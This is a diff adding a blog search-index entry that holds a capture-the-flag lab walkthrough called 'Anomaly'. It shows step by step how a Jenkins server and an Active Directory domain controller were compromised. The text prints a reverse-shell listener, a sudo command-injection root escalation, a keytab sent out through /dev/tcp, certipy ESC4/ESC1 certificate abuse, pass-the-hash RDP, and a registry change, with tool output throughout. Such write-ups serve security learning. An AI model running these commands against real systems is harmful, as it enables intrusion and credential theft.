@@ -1300,4 +1300,88 @@ msf exploit(windows/local/cve_2024_35250_ks_driver) &gt; run[*] Started reverse 
         <tag>Windows Kernel LPE</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Anomaly</title>
+    <url>/2025/11/24/Anomaly/</url>
+    <content><![CDATA[
+These pair of machines was pretty fun. Starting off on a ubuntu machine with just 2 ports open. Scanning shows port 8080 and when viewing this in a browser shows its running Jenkins and with a flick of the wrist, using admin:admin gets in the door. From here we can go to /script and use groovy or, you can create and build. Using a little reverse shell gets us on the machine after building. 
+From user jenkins, we enumerate to find some binaries set with the sticky bit, as well as it requires no password for us from viewing our privileges using sudo. Coming to find a binary called router_config, we get this back to our machine and look at it with strings. Finding its not a complicated binary but uses puts as a function, nevertheless, looking at how it works left room to play as it didn’t sanitize any input. So simply running a little hello world, works to show we can run a command and get root on this system. From root, we find a keytab find only holding the AES-256 hash for Brandon_Boyd. Which we can use to get a TGT from the Windows Machine.
+Enumerating the Windows Machine we find our users cleartext password in the description. Having port 80 running on this machine and nmap giving us back certificate information, we attack ADCS. Looking for escalation paths we have one vulnerable to ESC4 and ESC1, which in turn wants Domain Computers, Domain Admins, basically nothing we’re apart of. Looking at our user some more we find we have a MachineAccountQuota and can create a computer. So after doing so we exploit ESC4 to overwrite the template adding ourselves to the enrollment rights. Then perform traditional ESC1, requesting as a user apart of Domain Admins, being anna_molly. Then we authenticate with the pfx and obtain her hash. Afterwards, you can do whatever, secretsdump.py, and obtain hashes and secrets of the machine. Yet RDP is open 🤔. We have access yet when trying to access we get an error stating blank passwords cannot be used. Adding a value to the registry can bypass this giving you access to rdp to the machine.
+Initial Scan (2 Machines)Linux Machine:
+PORT     STATE SERVICE    REASON22/tcp   open  ssh        syn-ack8080/tcp open  http-proxy syn-ack
+Windows Machine:
+PORT     STATE SERVICE          REASON53/tcp   open  domain           syn-ack80/tcp   open  http             syn-ack88/tcp   open  kerberos-sec     syn-ack135/tcp  open  msrpc            syn-ack139/tcp  open  netbios-ssn      syn-ack389/tcp  open  ldap             syn-ack445/tcp  open  microsoft-ds     syn-ack464/tcp  open  kpasswd5         syn-ack593/tcp  open  http-rpc-epmap   syn-ack636/tcp  open  ldapssl          syn-ack3268/tcp open  globalcatLDAP    syn-ack3269/tcp open  globalcatLDAPssl syn-ack3389/tcp open  ms-wbt-server    syn-ack
+
+So we have no credentials and we have to find a way in. Less ports to deal with on the linux machine.
+At Your Service
+Seeing Jenkins running made me happy 😈. Trying common password combos let us right in.
+
+From here you would try to find a Script Console to run groovy script (no pun intended 😂). This lies at /script, but I just built a project and got a shell.
+
+Then our shell:
+konoha# nc -lvnp 9001listening on [any] 9001 ...connect to [10.200.21.55] from (UNKNOWN) [10.1.97.141] 34754python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;jenkins@ip-10-1-97-141:~/workspace/namely$
+
+Thats not right!!
+Enumeration finds that our permissions give us the ability to run /usr/bin/router_config using sudo. I got it over to my machine and took a look. Seeing how this binary worked I was pretty sure I can run whatever I want as the second arguement, as it doesn’t look like there is any sanitization. 
+jenkins@ip-10-1-97-141:~/workspace/namely$ sudo -u root /usr/bin/router_config &#x27;echo hello_world&#x27;&lt;o -u root /usr/bin/router_config &#x27;echo hello_world&#x27;Welcome to Router Configuration Utility v1.2Applying configuration...Applying config from echo hello_worldhello_worldConfiguration applied successfully!jenkins@ip-10-1-97-141:~/workspace/namely$
+
+With this knowledge I escalated on the machine.
+jenkins@ip-10-1-97-141:~/workspace/namely$ sudo -u root /usr/bin/router_config &#x27;/usr/bin/bash -p&#x27;&lt;o -u root /usr/bin/router_config &#x27;/usr/bin/bash -p&#x27;Welcome to Router Configuration Utility v1.2Applying configuration...Applying config from /usr/bin/bash -proot@ip-10-1-97-141:/var/lib/jenkins/workspace/namely#
+
+Since we’re root we can enumerate the machine some more. Knowing we have a windows machine in the environment, we can look at kerberos. This finds us the config and the keytab file which we extract to our machine.
+root@ip-10-1-97-141:/var/lib/jenkins/workspace/namely# cat /et/krb5.keytab &gt; /dev/tcp/10.200.21.55/9001---konoha# nc -lvnp 9001 &gt; keytab
+
+A little trick. Not really secure but gets the job done.
+Extract the Keytab
+Using python3 with keytabextract.py we get some information for a user.
+konoha# python3 /opt/tools/KeyTabExtract/keytabextract.py krb5.keytab.anomaly[!] No RC4-HMAC located. Unable to extract NTLM hashes.[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.[+] Keytab File successfully imported.	REALM : ANOMALY.HSM	SERVICE PRINCIPAL : Brandon_Boyd/	AES-256 HASH : &lt;SNIP&gt;
+
+Then we can obtain a TGT using this hash.
+(.impacket) konoha# getTGT.py -dc-ip 10.1.24.117 -aesKey &lt;SNIP&gt; &#x27;anomaly.hsm/Brandon_boyd&#x27;Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies[*] Saving ticket in Brandon_boyd.ccache
+
+Low Hanging FruitWith this ticket we can look at other users, and descriptions, which when we do we find a cleartext password for Brandon_Boyd.
+konoha# nxc ldap ANOMALY-DC.anomaly.hsm -u Brandon_Boyd -k --use-kcache -M get-desc-usersLDAP        ANOMALY-DC.anomaly.hsm 389    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 (name:ANOMALY-DC) (domain:anomaly.hsm)LDAPS       ANOMALY-DC.anomaly.hsm 636    ANOMALY-DC       [+] anomaly.hsm\Brandon_BoydGET-DESC... ANOMALY-DC.anomaly.hsm 389    ANOMALY-DC       [+] Found following users:GET-DESC... ANOMALY-DC.anomaly.hsm 389    ANOMALY-DC       User: Administrator description: Built-in account for administering the computer/domainGET-DESC... ANOMALY-DC.anomaly.hsm 389    ANOMALY-DC       User: Guest description: Built-in account for guest access to the computer/domainGET-DESC... ANOMALY-DC.anomaly.hsm 389    ANOMALY-DC       User: krbtgt description: Key Distribution Center Service AccountGET-DESC... ANOMALY-DC.anomaly.hsm 389    ANOMALY-DC       User: Brandon_Boyd description: &lt;SNIP&gt;
+
+Let’s move on to ADCS.
+You can tell anyone by their Certificate Services
+With ADCS running, which we saw in our nmap output, we can look at templates and identify vulnerable ones. This one stood out, as we are not apart of the Domain Computers group, but we can see if we have a quota to create one.
+konoha# certipy find -u Brandon_Boyd@anomaly.hsm -p &#x27;&lt;SNIP&gt;&#x27; -dc-ip 10.1.24.117 -stdout&lt;SNIP&gt;Certificate Templates  0    Template Name                       : CertAdmin    Display Name                        : CertAdmin    Certificate Authorities             : anomaly-ANOMALY-DC-CA-2    Enabled                             : True    Client Authentication               : True    Enrollment Agent                    : False    Any Purpose                         : False    Enrollee Supplies Subject           : True    Certificate Name Flag               : EnrolleeSuppliesSubject    Enrollment Flag                     : IncludeSymmetricAlgorithms                                          PublishToDs    Private Key Flag                    : ExportableKey    Extended Key Usage                  : Client Authentication                                          Secure Email                                          Encrypting File System    Requires Manager Approval           : False    Requires Key Archival               : False    Authorized Signatures Required      : 0    Schema Version                      : 2    Validity Period                     : 99 years    Renewal Period                      : 650430 hours    Minimum RSA Key Length              : 2048    Template Created                    : 2025-09-21T17:57:59+00:00    Template Last Modified              : 2025-09-21T17:58:00+00:00    Permissions      Enrollment Permissions        Enrollment Rights               : ANOMALY.HSM\Domain Admins                                          ANOMALY.HSM\Enterprise Admins      Object Control Permissions        Owner                           : ANOMALY.HSM\Administrator        Full Control Principals         : ANOMALY.HSM\Domain Admins                                          ANOMALY.HSM\Enterprise Admins                                          ANOMALY.HSM\Domain Computers        Write Owner Principals          : ANOMALY.HSM\Domain Admins                                          ANOMALY.HSM\Enterprise Admins                                          ANOMALY.HSM\Domain Computers        Write Dacl Principals           : ANOMALY.HSM\Domain Admins                                          ANOMALY.HSM\Enterprise Admins                                          ANOMALY.HSM\Domain Computers        Write Property Enroll           : ANOMALY.HSM\Domain Admins                                          ANOMALY.HSM\Enterprise Admins    [+] User Enrollable Principals      : ANOMALY.HSM\Domain Computers    [+] User ACL Principals             : ANOMALY.HSM\Domain Computers    [!] Vulnerabilities      ESC1                              : Enrollee supplies subject and template allows client authentication.      ESC4                              : User has dangerous permissions.
+
+Our quota for this user:
+konoha# nxc ldap ANOMALY-DC.anomaly.hsm -u Brandon_Boyd -p &#x27;&lt;SNIP&gt;&#x27; -M maqLDAP        10.1.24.117     389    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 (name:ANOMALY-DC) (domain:anomaly.hsm)LDAPS       10.1.24.117     636    ANOMALY-DC       [+] anomaly.hsm\Brandon_Boyd:&lt;SNIP&gt;MAQ         10.1.24.117     389    ANOMALY-DC       [*] Getting the MachineAccountQuotaMAQ         10.1.24.117     389    ANOMALY-DC       MachineAccountQuota: 10
+
+Creating the futureWe can use bloodyAD to create a computer(you can do this multiple ways).
+bloodyAD -v DEBUG -d ANOMALY.HSM -u Brandon_Boyd -p &#x27;&lt;SNIP&gt;&#x27; -H ANOMALY-DC.anomaly.hsm add computer JIPPITY jay123[*] Trying to connect to ANOMALY-DC.anomaly.hsm...[*] Connection successful[+] JIPPITY$ created
+
+ESC4 hits differentThe idea is the Domain Computers has access to this template. So we can overwrite it and add ourselves to enrollment rights.
+konoha# certipy -debug template -template CertAdmin -u &#x27;JIPPITY$@anomaly.hsm&#x27; -p &#x27;jay123&#x27; -dc-ip 10.1.24.117 -dc-host ANOMALY-DC.anomaly.hsm -no-save -forceCertipy v5.0.3 - by Oliver Lyak (ly4k)[+] Nameserver: &#x27;10.1.24.117&#x27;[+] DC IP: &#x27;10.1.24.117&#x27;[+] DC Host: &#x27;ANOMALY-DC.anomaly.hsm&#x27;[+] Target IP: &#x27;10.1.24.117&#x27;[+] Remote Name: &#x27;ANOMALY-DC.anomaly.hsm&#x27;[+] Domain: &#x27;ANOMALY.HSM&#x27;[+] Username: &#x27;JIPPITY$
+
+Normal for ESC1Then we can can request a pfx supplying the upn and target sid to a Domain Admin user like anna_molly.
+konoha# certipy -debug req -u &#x27;JIPPITY$@anomaly.hsm&#x27; -p &#x27;jay123&#x27; -dc-ip 10.1.24.117 -ca &#x27;anomaly-ANOMALY-DC-CA-2&#x27; -template &#x27;CertAdmin&#x27; -upn &#x27;anna_molly@anomaly.hsm&#x27; -dns anomaly-ANOMALY-DC-CA-2 -target 10.1.24.117 -sid &#x27;S-1-5-21-1496966362-3320961333-4044918980-1105&#x27;Certipy v5.0.3 - by Oliver Lyak (ly4k)[+] DC host (-dc-host) not specified. Using domain as DC host[+] Nameserver: &#x27;10.1.24.117&#x27;[+] DC IP: &#x27;10.1.24.117&#x27;[+] DC Host: &#x27;ANOMALY.HSM&#x27;[+] Target IP: &#x27;10.1.24.117&#x27;[+] Remote Name: &#x27;10.1.24.117&#x27;[+] Domain: &#x27;ANOMALY.HSM&#x27;[+] Username: &#x27;JIPPITY$&#x27;[+] Generating RSA key[*] Requesting certificate via RPC[+] Trying to connect to endpoint: ncacn_np:10.1.24.117[\pipe\cert][+] Connected to endpoint: ncacn_np:10.1.24.117[\pipe\cert][*] Request ID is 25[*] Successfully requested certificate[*] Got certificate with multiple identities    UPN: &#x27;anna_molly@anomaly.hsm&#x27;    DNS Host Name: &#x27;anomaly-ANOMALY-DC-CA-2&#x27;[+] Found SID in SAN URL: &#x27;S-1-5-21-1496966362-3320961333-4044918980-1105&#x27;[+] Found SID in security extension: &#x27;S-1-5-21-1496966362-3320961333-4044918980-1105&#x27;[*] Certificate object SID is &#x27;S-1-5-21-1496966362-3320961333-4044918980-1105&#x27;[*] Saving certificate and private key to &#x27;anna_molly_anomaly-anomaly-dc-ca-2.pfx&#x27;
+PrivEsc for Mrs. MollyNow we can obtain her NTLM hash.
+konoha# certipy auth -username &#x27;anna_molly&#x27; -domain &#x27;anomaly.hsm&#x27; -dc-ip 10.1.24.117 -no-save -pfx anna_molly_anomaly-anomaly-dc-ca-2.pfxCertipy v5.0.3 - by Oliver Lyak (ly4k)[*] Certificate identities:[*]     SAN UPN: &#x27;anna_molly@anomaly.hsm&#x27;[*]     SAN DNS Host Name: &#x27;anomaly-ANOMALY-DC-CA-2&#x27;[*]     SAN URL SID: &#x27;S-1-5-21-1496966362-3320961333-4044918980-1105&#x27;[*]     Security Extension SID: &#x27;S-1-5-21-1496966362-3320961333-4044918980-1105&#x27;[*] Found multiple identities in certificate[*] Using identity: UPN: anna_molly@anomaly.hsm[*] Using principal: &#x27;anna_molly@anomaly.hsm&#x27;[*] Trying to get TGT...[*] Got TGT[*] Trying to retrieve NT hash for &#x27;anna_molly&#x27;[*] Got hash for &#x27;anna_molly@anomaly.hsm&#x27;: aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;
+
+I didn’t want to RDP right away. I tried a couple of things, SMB, WMI, PSEXEC and just wasn’t as reliable to get on the machine. I presume AV and AMSI, stopped many of my attempts or kicked me off after a while. Nevertheless, we ended up using RDP. At first, we have only the hash, and most likely not crackable. Therefore, we can just PTH(Pass-the-Hash) with something like xfreerdp. But when trying to do so we get an error.
+konoha# xfreerdp /v:10.1.24.117 /u:anna_molly /pth:&lt;SNIP&gt; /dynamic-resolution +clipboard /tls-seclevel:0
+
+
+I’m get on!!We can fix this using reg.py and add a DWORD that will allow for blank passwords. Then try again.
+(.impacket) konoha# reg.py -hashes :be4bf3131851aee9a424c58e02879f6e &#x27;anomaly.hsm/anna_molly@10.1.24.117&#x27; add -keyName HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v DisableRestrictedAdmin -vt REG_DWORD -vd &#x27;0&#x27;
+
+
+Was messing around trying to bypass AMSI, though I didn’t need to
+
+]]></content>
+      <categories>
+        <category>hacksmarter</category>
+      </categories>
+      <tags>
+        <tag>ADCS</tag>
+        <tag>Registry</tag>
+        <tag>Jenkins</tag>
+        <tag>sudo abuse</tag>
+        <tag>ESC4</tag>
+        <tag>ESC1</tag>
+      </tags>
+  </entry>
 </search>
